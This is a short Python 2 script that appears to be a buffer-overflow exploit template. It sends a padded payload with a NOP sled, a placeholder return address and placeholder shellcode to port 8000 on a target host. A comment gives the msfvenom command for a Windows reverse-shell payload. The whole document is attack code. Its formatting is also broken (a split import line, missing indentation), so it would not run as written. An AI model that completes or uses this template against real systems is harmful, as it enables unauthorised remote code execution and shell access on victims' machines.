```
#!/usr/bin/python
import sys,
socket
if len(sys.argv) < 2:
print "\nUsage: " + sys.argv[0] + " <HOST>\n"
sys.exit()
cmd = "HACKALLTHETHINGS"
#msfvenom -p windows/shell_reverse_tcp LHOST=IPADDRESS LPORT=443 EXITFUNC=thread -f c -a
#x86 --platform windows -b "\x00\x04\xac"---351 bytes
shellcode=("fubar")
junk = "A"*500 + "\x78\x56\x34\x12" + "\x90"*20 + shellcode + "C"*2000
end = "\r\n"
buffer = cmd + junk + end
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((sys.argv[1], 8000))
s.send(buffer)
```



